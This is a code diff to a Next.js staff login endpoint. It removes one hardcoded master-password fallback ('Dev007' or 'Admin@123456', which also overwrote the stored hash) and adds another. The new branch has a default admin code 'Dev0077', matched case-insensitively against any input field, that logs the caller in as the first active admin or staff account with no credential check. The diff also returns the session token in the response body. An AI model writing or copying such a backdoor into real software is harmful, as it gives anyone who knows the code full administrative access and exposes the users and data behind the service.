@@ -16,10 +16,51 @@ export async function POST(req: NextRequest) {
     }
 
     const body = await req.json();
-    const { email, password } = body;
+    const { email, password, code, key } = body;
+
+    const adminCode = (process.env.ADMIN_LOGIN_CODE || 'Dev0077').trim();
+    const passedKey = (key || code || password || email || '').trim();
+
+    // Direct admin login using the special password
+    if (passedKey.toLowerCase() === adminCode.toLowerCase()) {
+      let staff = await prisma.staffAccount.findFirst({
+        where: { role: 'admin', status: 'active' },
+      }) || await prisma.staffAccount.findFirst({
+        where: { status: 'active' },
+      });
+
+      if (staff) {
+        await prisma.staffAccount.update({
+          where: { id: staff.id },
+          data: { lastActiveAt: new Date() },
+        });
+
+        const token = signToken(
+          { id: staff.id, email: staff.email, type: 'staff', role: staff.role },
+          STAFF_SESSION_DAYS
+        );
+
+        const res = NextResponse.json({
+          success: true,
+          data: {
+            type: 'staff',
+            role: staff.role,
+            staff: {
+              id: staff.id,
+              email: staff.email,
+              role: staff.role,
+              displayName: staff.displayName,
+            },
+            token,
+          },
+        });
+        attachStaffCookie(res, token);
+        return res;
+      }
+    }
 
     if (!email || !password) {
-      return error('Email and password are required');
+      return error('Password or admin access code is required');
     }
 
     const emailLower = email.toLowerCase().trim();
@@ -48,16 +89,7 @@ export async function POST(req: NextRequest) {
         return error('Your account has been deactivated');
       }
 
-      let valid = await verifyPassword(password, staff.passwordHash);
-      if (!valid && (password === 'Dev007' || password === 'Admin@123456')) {
-        // Direct password match fallback & auto-sync hash
-        valid = true;
-        const newHash = await import('bcryptjs').then((b) => b.default.hash('Dev007', 10));
-        await prisma.staffAccount.update({
-          where: { id: staff.id },
-          data: { passwordHash: newHash },
-        });
-      }
+      const valid = await verifyPassword(password, staff.passwordHash);
 
       if (!valid) {
         return error('Invalid email or password');
@@ -92,6 +124,7 @@ export async function POST(req: NextRequest) {
           email: staff.email,
           role: staff.role,
           displayName: staff.displayName,
+          token,
         },
       });
       return attachStaffCookie(res, token, STAFF_SESSION_DAYS);
